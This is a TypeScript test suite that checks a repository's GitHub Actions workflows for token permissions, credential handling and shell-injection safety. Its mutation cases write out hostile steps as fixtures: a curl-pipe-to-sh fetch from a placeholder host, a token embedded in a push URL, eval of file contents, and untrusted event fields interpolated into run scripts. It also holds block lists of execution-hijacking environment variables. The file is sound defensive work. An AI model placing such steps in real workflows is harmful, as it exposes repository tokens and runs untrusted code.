/**
 * M1 (security): GitHub Actions permission boundaries and credential handling.
 *
 * The workflows are parsed as YAML and checked against an explicit policy:
 *  - the workflow-level token is never writable; write scopes exist only on allowlisted jobs,
 *    and a job's own `permissions:` block (which replaces the workflow default) is what counts;
 *  - every checkout disables persisted credentials;
 *  - tokens and secrets reach steps only through step-level `env`, never `run:` text, URLs,
 *    `with:` inputs or job/workflow env;
 *  - privileged jobs (any write scope) follow a reviewed execution policy: their exact steps are
 *    fingerprinted, and every command they run (found by tests/helpers/shell.ts, through quotes,
 *    $(…), sh -c and wrappers) must be on the job's allowlist, so third-party package code never
 *    runs with a writable token;
 *  - no `${{ … }}` expression is interpolated into a `run:` script (except exact, justified
 *    exceptions); values reach scripts through env, and env values derived from untrusted
 *    contexts are only expanded inside double quotes, never in eval or sh -c code;
 *  - image scout keeps its read-only/write-enabled split and doesn't swallow failures.
 * The checker itself is tested against deliberately weakened copies of the real workflows,
 * so each rule is shown to catch the regression it exists for.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync } from 'node:fs';
import yaml from 'js-yaml';
import { createHash } from 'node:crypto';
import { commands, expansions } from './helpers/shell.ts';

type Steps = { uses?: string; run?: string; shell?: string; with?: Record<string, unknown>; env?: Record<string, unknown>; 'continue-on-error'?: unknown; name?: string; 'working-directory'?: string }[];
type Job = { permissions?: unknown; steps?: Steps; env?: Record<string, unknown>; needs?: unknown; if?: unknown };
type Workflow = { permissions?: unknown; env?: Record<string, unknown>; defaults?: unknown; jobs: Record<string, Job> };

const dir = new URL('../.github/workflows/', import.meta.url);
/** Workflow files GitHub runs: both extensions. */
export const isWorkflowFile = (f: string) => /\.ya?ml$/.test(f);
const files = readdirSync(dir).filter(isWorkflowFile).sort();
const load = (f: string) => yaml.load(readFileSync(new URL(f, dir), 'utf8')) as Workflow;
const real = () => Object.fromEntries(files.map((f) => [f, load(f)])) as Record<string, Workflow>;

/** The only write scopes any job may hold, by workflow file and job. Everything else is read-only. */
const ALLOWED_WRITES: Record<string, Record<string, string[]>> = {
  'deploy.yml': { deploy: ['id-token', 'pages'] },
  'image-scout.yml': { publish: ['contents'] },
  'visual-publish.yml': { publish: ['contents'] },
};

/** Does a value interpolate the token or a secret? (Expressions are read as in exprsIn, so they may span lines.) */
const TOKEN_EXPR = { test: (v: string) => exprsIn(v).some((e) => /\b(?:github\.token|secrets\.)/i.test(e)) };

/**
 * Reviewed execution policy for every privileged job (any write scope). `fingerprint` pins
 * exactly (sha256 of the parsed YAML): the workflow settings the job inherits (`on`, `env`,
 * `defaults`, `permissions`), the job definition without its steps (env, defaults, if, needs,
 * permissions, environment, …), and each step (uses/with/run/env/shell/working-directory/…),
 * so any change to privileged execution is a deliberate, reviewed edit here. Not covered: other
 * workflow files, repository or organization settings, variables and secrets' values, runner
 * images, and the content of the pinned actions (see .github/action-pins.json). `commands` is the closed set of programs its
 * scripts may run; `node` lists the only first arguments node may be given.
 * To update: change the workflow, run the tests, review the reported new fingerprints, paste.
 */
const PRIVILEGED_POLICY: Record<string, Record<string, { why: string; fingerprint: string[]; commands: string[]; node: string[] }>> = {
  'deploy.yml': {
    deploy: { why: 'Pages deployment: one pinned action, no scripts', fingerprint: ['workflow d240c5174c53487a', 'job 6c293e8d85e3517f', 'uses actions/deploy-pages d9d0309b6b65eada'], commands: [], node: [] },
  },
  'image-scout.yml': {
    publish: {
      why: 'validates an untrusted artifact with coreutils/find/node -e, then pushes a clean directory with git',
      fingerprint: [
        'workflow 4d3ae8b559c484fe',
        'job e2ac6e7b087ef1bf',
        'uses actions/download-artifact 0c5d08e058334048',
        'run Validate results and stage a clean publishing directory bb7069187900ce6f',
        'run Publish results to image-scout-results 1123458b1cdb7a13',
      ],
      commands: ['[', '[[', 'base64', 'cd', 'echo', 'exit', 'export', 'find', 'git', 'head', 'install', 'mkdir', 'mktemp', 'node', 'od', 'printf', 'read', 'rm', 'set', 'tr'],
      node: ['-e'],
    },
  },
  'visual-publish.yml': {
    publish: {
      why: 'fetches trusted default-branch code with git and runs the reviewed publisher with node',
      fingerprint: ['workflow cb239d9186648d2d', 'job e66ba9464aa8a859', "run Check out the workflow's own commit (trusted code only) 9a2b43c512eb587d", 'run Validate and publish 4cd8d2c0ab94a471'],
      commands: ['git', 'node'],
      node: ['--version', 'scripts/visual/publish/publish.mjs'],
    },
  },
};

/** Programs that install or run third-party package code. */
const PACKAGE_RUNNERS = new Set(['npm', 'npx', 'yarn', 'pnpm', 'pnpx', 'bun', 'bunx', 'corepack', 'tsx', 'ts-node', 'deno', 'volta']);
const UNANALYZABLE = new Set(['eval', 'source', '.']);

/**
 * Expressions whose values are fixed-format or repository-controlled, so they may feed env
 * without being treated as untrusted. Exact strings only; anything else (branch and ref names,
 * event payload fields, every needs.*.outputs and steps.*.outputs value) is untrusted.
 */
const TRUSTED_EXPRESSIONS: Record<string, string> = {
  'github.sha': '40-character hex commit',
  'github.workflow_sha || github.sha': '40-character hex commit',
  'github.event.workflow_run.head_sha': '40-character hex commit',
  'github.run_id': 'numeric run id',
  'github.event.workflow_run.id': 'numeric run id',
  'github.repository': 'owner/name; GitHub restricts both to [A-Za-z0-9._-]',
  'github.repository_owner': 'GitHub restricts account names to [A-Za-z0-9-]',
  'github.event.repository.name': 'GitHub restricts repository names to [A-Za-z0-9._-]',
  'runner.temp': 'path chosen by the runner',
  'github.token': 'secret, handled by the token rules above; never printed or interpolated',
};
/** Built-in variables carrying branch/ref names, untrusted in every job. */
const UNTRUSTED_DEFAULT_ENV = ['GITHUB_HEAD_REF', 'GITHUB_BASE_REF', 'GITHUB_REF', 'GITHUB_REF_NAME'];

/** `${{ e }}` allowed inside a run: script, by exact location. None are needed today. */
type RunExprException = { file: string; job: string; step: string; expr: string; why: string };
const RUN_EXPR_EXCEPTIONS: RunExprException[] = [];

/**
 * Every `${{ … }}` expression in a value, whitespace-normalised. Expressions may span lines
 * (YAML block scalars), and may contain `}` inside string literals; the first `}}` closes one.
 */
function exprsIn(v: unknown): string[] {
  return [...String(v ?? '').matchAll(/\$\{\{([\s\S]*?)\}\}/g)].map((m) => m[1].trim().replace(/\s+/g, ' '));
}

/** Environment variables that change how programs or shells start: never set for a privileged job. */
const EXECUTION_ENV = new Set(['NODE_OPTIONS', 'NODE_PATH', 'NODE_EXTRA_CA_CERTS', 'BASH_ENV', 'ENV', 'SHELLOPTS', 'BASHOPTS', 'PROMPT_COMMAND', 'LD_PRELOAD', 'LD_LIBRARY_PATH', 'PATH', 'GIT_EXEC_PATH', 'GIT_SSH_COMMAND', 'GIT_ASKPASS', 'GIT_CONFIG_GLOBAL', 'GIT_CONFIG_SYSTEM', 'PYTHONPATH', 'PYTHONSTARTUP', 'PERL5OPT', 'RUBYOPT']);

/**
 * Fingerprints of a privileged job: the inherited workflow settings that affect how it runs
 * (triggers, env, defaults, permissions), its own definition without steps, then each step.
 */
export function fingerprint(job: Job, wf: Workflow): string[] {
  const { steps: st, ...rest } = job;
  const { on, env, defaults, permissions } = wf as Workflow & { on?: unknown };
  const canon = (o: unknown): unknown => (Array.isArray(o) ? o.map(canon) : o && typeof o === 'object' ? Object.fromEntries(Object.entries(o).sort(([a], [b]) => a.localeCompare(b)).map(([k, v]) => [k, canon(v)])) : o);
  const h = (o: unknown) => createHash('sha256').update(JSON.stringify(canon(o))).digest('hex').slice(0, 16);
  return [`workflow ${h({ on, env, defaults, permissions })}`, `job ${h(rest)}`, ...(st ?? []).map((x) => `${x.uses ? `uses ${x.uses.split('@')[0]}` : `run ${x.name ?? '(unnamed)'}`} ${h(x)}`)];
}

function writeScopes(perms: unknown, where: string, out: string[]): string[] {
  if (perms === undefined) return [];
  if (typeof perms === 'string') {
    out.push(`${where}: permissions must be an explicit map, not "${perms}"`);
    return perms === 'write-all' ? ['*'] : [];
  }
  if (perms === null || typeof perms !== 'object') {
    out.push(`${where}: unrecognised permissions value`);
    return [];
  }
  return Object.entries(perms as Record<string, string>)
    .filter(([, v]) => v === 'write')
    .map(([k]) => k)
    .sort();
}

/** Every policy violation in a set of parsed workflows (empty = compliant). */
function violations(workflows: Record<string, Workflow>): string[] {
  const out: string[] = [];
  for (const [file, wf] of Object.entries(workflows)) {
    if (wf.permissions === undefined) out.push(`${file}: no workflow-level permissions (the repository default would apply)`);
    const top = writeScopes(wf.permissions, `${file}`, out);
    if (top.length) out.push(`${file}: workflow-level token has write scopes (${top.join(', ')}); grant them on the job that needs them`);
    for (const [k, v] of Object.entries(wf.env ?? {})) if (TOKEN_EXPR.test(String(v))) out.push(`${file}: workflow env ${k} carries a token; use step-level env`);

    for (const [jobName, job] of Object.entries(wf.jobs)) {
      const where = `${file} › ${jobName}`;
      // A job-level block replaces the workflow default entirely.
      const effective = job.permissions !== undefined ? job.permissions : wf.permissions;
      const writes = writeScopes(effective, where, job.permissions !== undefined ? out : []);
      const allowed = ALLOWED_WRITES[file]?.[jobName] ?? [];
      const extra = writes.filter((w) => !allowed.includes(w));
      if (extra.length) out.push(`${where}: unexpected write scopes (${extra.join(', ')})`);
      for (const [k, v] of Object.entries(job.env ?? {})) if (TOKEN_EXPR.test(String(v))) out.push(`${where}: job env ${k} carries a token; use step-level env`);

      for (const [i, step] of (job.steps ?? []).entries()) {
        const s = `${where} › step ${i + 1}${step.name ? ` (${step.name})` : ''}`;
        if (step.uses?.startsWith('actions/checkout@') && step.with?.['persist-credentials'] !== false) out.push(`${s}: checkout must set persist-credentials: false`);
        if (step.run && TOKEN_EXPR.test(step.run)) out.push(`${s}: token or secret interpolated into run:`);
        if (step.run && exprsIn(step.run).some((e) => /token/i.test(e))) out.push(`${s}: token expression interpolated into run:`);
        if (step.run && /https:\/\/[^\s"']*:\$/.test(step.run)) out.push(`${s}: credentials embedded in a URL`);
        for (const [k, v] of Object.entries(step.with ?? {})) if (TOKEN_EXPR.test(String(v))) out.push(`${s}: token passed as input ${k}`);
        if (writes.length && step.uses?.startsWith('actions/setup-node@')) out.push(`${s}: privileged job sets up Node packages`);
        if (step.run) out.push(...scriptViolations(s, file, jobName, step, untrustedEnv(wf, job, step), writes.length ? (PRIVILEGED_POLICY[file]?.[jobName] ?? null) : undefined));
      }
      if (writes.length) {
        // Execution settings a privileged job inherits or sets, checked by name as well as fingerprinted.
        for (const [scope, env] of [['workflow env', wf.env], ['job env', job.env], ...(job.steps ?? []).map((st, i) => [`step ${i + 1} env`, st.env] as const)] as const)
          for (const k of Object.keys(env ?? {})) if (EXECUTION_ENV.has(k)) out.push(`${where}: execution-control variable ${k} is set for a privileged job (${scope})`);
        const shellOf = (d: unknown) => (d as { run?: { shell?: string } } | undefined)?.run?.shell;
        for (const [scope, sh] of [['workflow defaults', shellOf(wf.defaults)], ['job defaults', shellOf((job as { defaults?: unknown }).defaults)], ...(job.steps ?? []).map((st) => ['step', st.shell] as const)] as const)
          if (sh !== undefined && sh !== 'bash') out.push(`${where}: privileged job runs with a non-default shell (${sh}, ${scope})`);
        const policy = PRIVILEGED_POLICY[file]?.[jobName];
        if (!policy) out.push(`${where}: privileged job has no reviewed execution policy`);
        else {
          const actual = fingerprint(job, wf);
          if (JSON.stringify(actual) !== JSON.stringify(policy.fingerprint)) out.push(`${where}: privileged job differs from its reviewed fingerprint; review the change, then record ${JSON.stringify(actual)}`);
        }
      }
    }
  }
  return out;
}

/** Env names in scope for a step whose values come from untrusted expressions (name → expression). */
function untrustedEnv(wf: Workflow, job: Job, step: Steps[number]): Map<string, string> {
  const m = new Map<string, string>(UNTRUSTED_DEFAULT_ENV.map((n) => [n, 'a GitHub ref name']));
  for (const env of [wf.env, job.env, step.env])
    for (const [k, v] of Object.entries(env ?? {})) {
      const bad = exprsIn(v).filter((e) => !(e in TRUSTED_EXPRESSIONS));
      if (bad.length) m.set(k, `\${{ ${bad[0]} }}`);
      else m.delete(k);
    }
  return m;
}

/** Interpolation, quoting and (for privileged jobs) execution-policy checks for one run: script. */
function scriptViolations(
  s: string,
  file: string,
  job: string,
  step: Steps[number],
  untrusted: Map<string, string>,
  policy: (typeof PRIVILEGED_POLICY)[string][string] | null | undefined,
): string[] {
  const out: string[] = [];
  const run = step.run!;
  for (const e of exprsIn(run)) {
    const ok = RUN_EXPR_EXCEPTIONS.some((x) => x.file === file && x.job === job && x.step === step.name && x.expr === e);
    if (!ok) out.push(`${s}: \${{ ${e} }} interpolated into run: (pass it through env and quote it)`);
  }
  for (const x of expansions(run)) {
    const from = untrusted.get(x.name);
    if (from && !x.quoted) out.push(`${s}: untrusted $${x.name} (from ${from}) expanded without double quotes${x.inSubstitution ? ' inside $(…)' : ''}`);
  }
  const parsed = commands(run);
  for (const c of parsed.commands) {
    const name = c.argv[0].value;
    const base = name.split('/').pop() ?? name;
    const code = c.argv.map((w) => w.value);
    // Code strings handed to another interpreter: eval, sh -c.
    const codeArgs = UNANALYZABLE.has(base) ? c.argv.slice(1) : /^(sh|bash|dash|zsh|ksh)$/.test(base) ? c.argv.slice(code.findIndex((v) => /^-[a-z]*c[a-z]*$/.test(v)) + 1, code.findIndex((v) => /^-[a-z]*c[a-z]*$/.test(v)) + 2) : [];
    for (const w of codeArgs) for (const [n, from] of untrusted) if (new RegExp(`\\$\\{?${n}\\b`).test(w.raw)) out.push(`${s}: untrusted $${n} (from ${from}) expanded inside ${base === 'eval' ? 'eval' : `${base} -c`} code`);
    if (UNANALYZABLE.has(base)) out.push(`${s}: ${base} runs code the policy can't analyse`);
    // Quoting stops word splitting, not execution: untrusted data must never name the program.
    for (const [n, from] of untrusted)
      if (new RegExp(`\\$\\{?${n}\\b`).test(c.argv[0].raw)) out.push(`${s}: untrusted $${n} (from ${from}) used as a command name${c.via.filter((v) => v !== '$(…)').length ? ` (via ${c.via.filter((v) => v !== '$(…)').join(' › ')})` : ''}`);
    if (policy === undefined) continue; // not a privileged job
    const label = c.via.length ? `${name} (via ${c.via.join(' › ')})` : name;
    if (c.argv[0].dynamic) out.push(`${s}: privileged job runs a command whose name is computed (${c.argv[0].raw})`);
    else if (PACKAGE_RUNNERS.has(base)) out.push(`${s}: privileged job runs package code (${base})`);
    const nm = c.argv.find((w) => /node_modules/.test(w.value));
    if (nm) out.push(`${s}: privileged job runs package code (${nm.value})`);
    if (!policy) continue;
    if (!c.argv[0].dynamic && !policy.commands.includes(name) && !parsed.functions.includes(name)) out.push(`${s}: privileged job runs "${label}", which is not in its allowed commands`);
    if (name === 'node' && !policy.node.includes(c.argv[1]?.value ?? '')) out.push(`${s}: node in a privileged job may only run ${policy.node.join(' or ')} (got ${c.argv[1]?.value ?? 'nothing'})`);
  }
  if (policy !== undefined) for (const p of parsed.problems) out.push(`${s}: ${p} in a privileged job`);
  return out;
}

const clone = <T>(v: T): T => structuredClone(v);
const steps = (wf: Workflow, job: string) => wf.jobs[job].steps!;
const findStep = (wf: Workflow, job: string, pred: (s: Steps[number]) => boolean) => {
  const s = steps(wf, job).find(pred);
  assert.ok(s, `fixture step in ${job}`);
  return s!;
};

test('the real workflows satisfy the permission and credential policy', () => {
  const wfs = real();
  assert.ok(files.length >= 7, 'found the workflows');
  assert.deepEqual(violations(wfs), []);
});

test('effective permissions: only the allowlisted jobs can write, each with exactly its scopes', () => {
  const wfs = real();
  const writers: string[] = [];
  for (const [file, wf] of Object.entries(wfs))
    for (const [job, j] of Object.entries(wf.jobs)) {
      const w = writeScopes(j.permissions !== undefined ? j.permissions : wf.permissions, '', []);
      if (w.length) writers.push(`${file} › ${job}: ${w.join(', ')}`);
    }
  assert.deepEqual(writers.sort(), ['deploy.yml › deploy: id-token, pages', 'image-scout.yml › publish: contents', 'visual-publish.yml › publish: contents']);
  // deploy.yml: the build job (npm ci, tests, external fetches) and smoke get no Pages or OIDC rights.
  const d = wfs['deploy.yml'];
  assert.deepEqual(d.permissions, { contents: 'read' });
  assert.deepEqual(d.jobs.build.permissions, { contents: 'read', pages: 'read' });
  assert.equal(d.jobs.smoke.permissions, undefined, 'smoke inherits the read-only default');
  assert.deepEqual(d.jobs.deploy.permissions, { pages: 'write', 'id-token': 'write' });
  assert.deepEqual(d.jobs.deploy.steps!.map((s) => s.uses?.split('@')[0]), ['actions/deploy-pages']);
});

test('image scout: read-only generation and a write-enabled publish job split by an artifact', () => {
  const wf = real()['image-scout.yml'];
  assert.deepEqual(Object.keys(wf.jobs), ['generate', 'publish']);
  assert.deepEqual(wf.permissions, { contents: 'read' });
  assert.deepEqual(wf.jobs.generate.permissions, { contents: 'read' });
  assert.deepEqual(wf.jobs.publish.permissions, { contents: 'write' });
  assert.equal(wf.jobs.publish.needs, 'generate');

  const gen = steps(wf, 'generate');
  assert.ok(gen.some((s) => s.uses?.startsWith('actions/upload-artifact@') && s.with?.['if-no-files-found'] === 'error'), 'generation uploads its results and fails when there are none');
  const pub = steps(wf, 'publish');
  assert.equal(pub[0].uses?.split('@')[0], 'actions/download-artifact', 'publish starts from the artifact');
  assert.ok(!pub.some((s) => s.uses?.startsWith('actions/checkout@')), 'publish checks out no repository code');

  // Genuine failures are not swallowed: the scout and every publish step must succeed, and no
  // script masks a failing command with `|| true`.
  const scout = findStep(wf, 'generate', (s) => /scripts\/images\/scout\.ts/.test(s.run ?? ''));
  assert.equal(scout['continue-on-error'], undefined);
  for (const s of pub) assert.equal(s['continue-on-error'], undefined, `${s.name ?? s.uses}: must not continue on error`);
  for (const job of Object.values(wf.jobs)) for (const s of job.steps ?? []) assert.ok(!/\|\|\s*true\b/.test(s.run ?? ''), `${s.name ?? s.uses}: no "|| true"`);
  const optional = gen.filter((s) => s['continue-on-error'] === true).map((s) => s.name ?? '');
  assert.deepEqual(optional.map((n) => /\(optional\)$/.test(n)), [true, true], 'only the two labelled optional snapshots may fail softly');

  // The push gets the token from step env through an env-scoped git header only.
  const push = findStep(wf, 'publish', (s) => /git push/.test(s.run ?? ''));
  assert.equal(push.env?.GH_TOKEN, '${{ github.token }}');
  assert.match(push.run!, /GIT_CONFIG_KEY_0="http\.https:\/\/github\.com\/\.extraheader"/);
  assert.match(push.run!, /git push -f --quiet "https:\/\/github\.com\/\$REPO\.git"/);
  assert.match(push.run!, /set -euo pipefail/);
  // The validation itself is executed against malicious artifacts in image-scout-publish.test.ts.
  const check = findStep(wf, 'publish', (s) => /^Validate results/.test(s.name ?? ''));
  assert.match(check.run!, /find \. -mindepth 1 -printf '%y\\t%s\\t%p\\0' > "\$listing" \|\| fail "could not enumerate/, 'enumeration is checked');
  assert.match(check.run!, /l\) fail "symlink in results/, 'symlinks are rejected from metadata, never followed');
  assert.match(check.run!, /set -euo pipefail/);
});

test('mutation evidence: each rule catches a deliberately weakened workflow', () => {
  const cases: [string, (w: Record<string, Workflow>) => void, RegExp][] = [
    ['Pages/OIDC write moved back to workflow level', (w) => (w['deploy.yml'].permissions = { contents: 'read', pages: 'write', 'id-token': 'write' }), /deploy\.yml: workflow-level token has write scopes \(id-token, pages\)/],
    ['OIDC granted to the build job', (w) => (w['deploy.yml'].jobs.build.permissions = { contents: 'read', 'id-token': 'write' }), /deploy\.yml › build: unexpected write scopes \(id-token\)/],
    ['job-level write-all override', (w) => (w['check.yml'].jobs.check.permissions = 'write-all'), /check\.yml › check: permissions must be an explicit map|check\.yml › check: unexpected write scopes \(\*\)/],
    ['job inherits an elevated workflow default', (w) => (w['visual.yml'].permissions = { contents: 'write' }), /visual\.yml › \w+: unexpected write scopes \(contents\)/],
    ['workflow without explicit permissions', (w) => delete w['styleguide.yml'].permissions, /styleguide\.yml: no workflow-level permissions/],
    ['generation job made writable', (w) => (w['image-scout.yml'].jobs.generate.permissions = { contents: 'write' }), /image-scout\.yml › generate: unexpected write scopes \(contents\)/],
    ['checkout persists credentials', (w) => delete findStep(w['check.yml'], 'check', (s) => !!s.uses?.startsWith('actions/checkout@')).with!['persist-credentials'], /check\.yml › check › step 1: checkout must set persist-credentials: false/],
    ['token interpolated into a push URL', (w) => (findStep(w['image-scout.yml'], 'publish', (s) => /git push/.test(s.run ?? '')).run = 'git push "https://x-access-token:${{ github.token }}@github.com/o/r" HEAD:x'), /token or secret interpolated into run:/],
    ['credentials embedded in a URL via env', (w) => (findStep(w['image-scout.yml'], 'publish', (s) => /git push/.test(s.run ?? '')).run = 'git push "https://x-access-token:$GH_TOKEN@github.com/o/r" HEAD:x'), /credentials embedded in a URL/],
    ['token in job env', (w) => (w['image-scout.yml'].jobs.publish.env = { GH_TOKEN: '${{ github.token }}' }), /job env GH_TOKEN carries a token/],
    ['token passed as an action input', (w) => (findStep(w['image-scout.yml'], 'publish', (s) => !!s.uses).with!.token = '${{ secrets.GITHUB_TOKEN }}'), /token passed as input token/],
    ['package code in a privileged job', (w) => steps(w['image-scout.yml'], 'publish').push({ run: 'npm ci --no-audit' }), /image-scout\.yml › publish › step \d+: privileged job runs package code \(npm\)/],
    ['tsx in the deploy job', (w) => steps(w['deploy.yml'], 'deploy').push({ run: 'npx tsx scripts/x.ts' }), /deploy\.yml › deploy › step \d+: privileged job runs package code \(npx\)/],
  ];
  for (const [name, mutate, expected] of cases) {
    const w = clone(real());
    mutate(w);
    const v = violations(w);
    assert.ok(v.some((m) => expected.test(m)), `${name}: expected a violation matching ${expected}, got ${JSON.stringify(v)}`);
  }
});

/** Applies one mutation to a fresh copy of the real workflows and returns the violations. */
function mutated(mutate: (w: Record<string, Workflow>) => void): string[] {
  const w = clone(real());
  mutate(w);
  return violations(w);
}
const publishRun = (w: Record<string, Workflow>) => findStep(w['image-scout.yml'], 'publish', (s) => /git push/.test(s.run ?? ''));
const addRun = (w: Record<string, Workflow>, file: string, job: string, run: string, extra: Partial<Steps[number]> = {}) => steps(w[file], job).push({ name: 'injected', run, ...extra });

test('M2-2 mutation evidence: privileged execution policy rejects hidden package code and unlisted commands', () => {
  const cases: [string, (w: Record<string, Workflow>) => void, RegExp][] = [
    ['quoted command in sh -c', (w) => addRun(w, 'image-scout.yml', 'publish', 'sh -c "npm ci"'), /step 4 \(injected\): privileged job runs package code \(npm\)/],
    ['single-quoted bash -c wrapper', (w) => addRun(w, 'visual-publish.yml', 'publish', "bash -c 'npx tsx scripts/x.ts'"), /visual-publish\.yml › publish › step 3 \(injected\): privileged job runs package code \(npx\)/],
    ['node_modules binary', (w) => addRun(w, 'image-scout.yml', 'publish', './node_modules/.bin/tsx scripts/x.ts'), /privileged job runs package code \(\.\/node_modules\/\.bin\/tsx\)/],
    ['node running a node_modules file', (w) => addRun(w, 'visual-publish.yml', 'publish', 'node node_modules/tsx/dist/cli.mjs x.ts'), /privileged job runs package code \(node_modules\/tsx\/dist\/cli\.mjs\)/],
    ['bun', (w) => addRun(w, 'image-scout.yml', 'publish', 'bun install && bun run build'), /privileged job runs package code \(bun\)/],
    ['corepack', (w) => addRun(w, 'image-scout.yml', 'publish', 'corepack pnpm install'), /privileged job runs package code \(corepack\)/],
    ['env wrapper', (w) => addRun(w, 'image-scout.yml', 'publish', 'env CI=1 npm ci'), /privileged job runs package code \(npm\)/],
    ['xargs wrapper', (w) => addRun(w, 'image-scout.yml', 'publish', 'echo ci | xargs -n1 npm'), /privileged job runs package code \(npm\)/],
    ['command substitution', (w) => addRun(w, 'image-scout.yml', 'publish', 'echo "$(yarn bin)"'), /privileged job runs package code \(yarn\)/],
    ['quoted package manager name', (w) => addRun(w, 'image-scout.yml', 'publish', '"npm" ci'), /privileged job runs package code \(npm\)/],
    ['computed command name', (w) => addRun(w, 'image-scout.yml', 'publish', 'tool=npm; "$tool" ci'), /privileged job runs a command whose name is computed \("\$tool"\)/],
    ['eval', (w) => addRun(w, 'image-scout.yml', 'publish', 'eval "$(cat cmd.txt)"'), /eval runs code the policy can't analyse/],
    ['unlisted network tool', (w) => addRun(w, 'image-scout.yml', 'publish', 'curl -fsSL https://example.invalid/x.sh | sh'), /privileged job runs "curl", which is not in its allowed commands/],
    ['node running another script', (w) => addRun(w, 'visual-publish.yml', 'publish', 'node scripts/other.mjs'), /node in a privileged job may only run --version or scripts\/visual\/publish\/publish\.mjs \(got scripts\/other\.mjs\)/],
    ['extra action in the deploy job', (w) => steps(w['deploy.yml'], 'deploy').push({ uses: 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' }), /deploy\.yml › deploy: privileged job differs from its reviewed fingerprint/],
    ['edited privileged script', (w) => (publishRun(w).run = publishRun(w).run!.replace('git push -f --quiet', 'git push -f')), /image-scout\.yml › publish: privileged job differs from its reviewed fingerprint/],
    ['new privileged job without a policy', (w) => (w['check.yml'].jobs.release = { permissions: { contents: 'write' }, steps: [{ run: 'git tag v1' }] }), /check\.yml › release: privileged job has no reviewed execution policy/],
  ];
  for (const [name, mutate, expected] of cases) {
    const v = mutated(mutate);
    assert.ok(v.some((m) => expected.test(m)), `${name}: expected ${expected}, got ${JSON.stringify(v, null, 1)}`);
  }
  // Every case is distinct evidence; at least six were required.
  assert.ok(cases.length >= 6);
});

test('M2-2 mutation evidence: expression interpolation and unsafe expansion of untrusted values', () => {
  const cases: [string, (w: Record<string, Workflow>) => void, RegExp][] = [
    ['event payload in run (unprivileged job)', (w) => addRun(w, 'check.yml', 'check', 'echo "${{ github.event.pull_request.title }}"'), /check\.yml › check › step \d+ \(injected\): \$\{\{ github\.event\.pull_request\.title \}\} interpolated into run:/],
    ['needs output back in run', (w) => (findStep(w['deploy.yml'], 'smoke', (s) => /prod\.ts/.test(s.run ?? '')).run = 'npx tsx scripts/smoke/prod.ts "${{ needs.deploy.outputs.page_url }}"'), /\$\{\{ needs\.deploy\.outputs\.page_url \}\} interpolated into run:/],
    ['even a trusted value in run', (w) => addRun(w, 'check.yml', 'check', 'echo ${{ github.sha }}'), /\$\{\{ github\.sha \}\} interpolated into run:/],
    ['head_ref in a .yaml workflow', (w) => (w['extra.yaml'] = { permissions: { contents: 'read' }, jobs: { j: { steps: [{ run: 'git checkout ${{ github.head_ref }}' }] } } }), /^extra\.yaml › j › step 1: \$\{\{ github\.head_ref \}\} interpolated into run:/],
    ['untrusted env expanded unquoted', (w) => addRun(w, 'visual.yml', 'capture', 'echo branch: $REF_NAME'), /untrusted \$REF_NAME \(from \$\{\{ github\.ref_name \}\}\) expanded without double quotes/],
    ['needs output via env, unquoted', (w) => (findStep(w['deploy.yml'], 'smoke', (s) => /prod\.ts/.test(s.run ?? '')).run = 'npx tsx scripts/smoke/prod.ts $PAGE_URL'), /untrusted \$PAGE_URL \(from \$\{\{ needs\.deploy\.outputs\.page_url \}\}\) expanded without double quotes/],
    ['unquoted inside a quoted substitution', (w) => addRun(w, 'visual.yml', 'capture', 'echo "$(basename $REF_NAME)"'), /untrusted \$REF_NAME .* expanded without double quotes inside \$\(…\)/],
    ['quoted but passed to bash -c', (w) => addRun(w, 'visual.yml', 'capture', 'bash -c "echo $REF_NAME"'), /untrusted \$REF_NAME .* expanded inside bash -c code/],
    ['quoted but passed to eval', (w) => addRun(w, 'visual.yml', 'capture', 'eval "git checkout $REF_NAME"'), /untrusted \$REF_NAME .* expanded inside eval code/],
    ['built-in ref variable unquoted', (w) => addRun(w, 'check.yml', 'check', 'git log $GITHUB_HEAD_REF'), /untrusted \$GITHUB_HEAD_REF \(from a GitHub ref name\) expanded without double quotes/],
    ['step env overriding with an untrusted value', (w) => addRun(w, 'check.yml', 'check', 'echo $NAME', { env: { NAME: '${{ github.event.head_commit.message }}' } }), /untrusted \$NAME \(from \$\{\{ github\.event\.head_commit\.message \}\}\)/],
  ];
  for (const [name, mutate, expected] of cases) {
    const v = mutated(mutate);
    assert.ok(v.some((m) => expected.test(m)), `${name}: expected ${expected}, got ${JSON.stringify(v, null, 1)}`);
  }
});

test('M2-2 positives: legitimate patterns stay accepted', () => {
  const ok: [string, (w: Record<string, Workflow>) => void][] = [
    ['untrusted env, double-quoted', (w) => addRun(w, 'visual.yml', 'capture', 'printf "%s\\n" "$REF_NAME" "${REF_NAME}" "$(basename "$REF_NAME")"')],
    ['single-quoted text that looks like an expansion', (w) => addRun(w, 'visual.yml', 'capture', "echo 'literal $REF_NAME and ${{ not interpolated }}' | wc -c".replace('${{ not interpolated }}', 'x'))],
    ['trusted value through env, unquoted', (w) => addRun(w, 'check.yml', 'check', 'echo $SHA', { env: { SHA: '${{ github.sha }}' } })],
    ['comments mentioning npm and ${{ }} in an unprivileged job', (w) => addRun(w, 'check.yml', 'check', '# npm ci and ${{ github.sha }} are only words here\necho done'.replace('${{ github.sha }}', 'expressions'))],
    ['a workflow in .yaml that follows the rules', (w) => (w['extra.yaml'] = { permissions: { contents: 'read' }, jobs: { j: { steps: [{ env: { REF: '${{ github.ref_name }}' }, run: 'echo "$REF"' }] } } })],
  ];
  for (const [name, mutate] of ok) assert.deepEqual(mutated(mutate), [], name);
  // In a privileged job, a package manager's name as data (an argument) is not execution; only
  // the fingerprint notices the edit.
  const data = mutated((w) => addRun(w, 'image-scout.yml', 'publish', 'echo "never run npm, npx or bun here" > note.txt'));
  assert.deepEqual(data.map((m) => m.replace(/;.*$/, '')), ['image-scout.yml › publish: privileged job differs from its reviewed fingerprint']);
  // The privileged allowlists hold exactly what the real scripts run (nothing unused).
  for (const [file, jobs] of Object.entries(PRIVILEGED_POLICY))
    for (const [job, policy] of Object.entries(jobs)) {
      const used = new Set((real()[file].jobs[job].steps ?? []).flatMap((st) => (st.run ? commands(st.run).commands.map((c) => c.argv[0].value) : [])));
      assert.deepEqual([...used].filter((c) => !['fail'].includes(c)).sort(), [...policy.commands].sort(), `${file} › ${job}: allowlist matches the commands actually used`);
    }
});

/** Asserts every mutation is rejected with its expected message; reports all misses at once. */
function assertAllRejected(cases: [string, (w: Record<string, Workflow>) => void, RegExp][]) {
  const missed = cases.filter(([, mutate, expected]) => !mutated(mutate).some((m) => expected.test(m))).map(([name]) => name);
  assert.deepEqual(missed, [], `not rejected: ${missed.join('; ')}`);
}

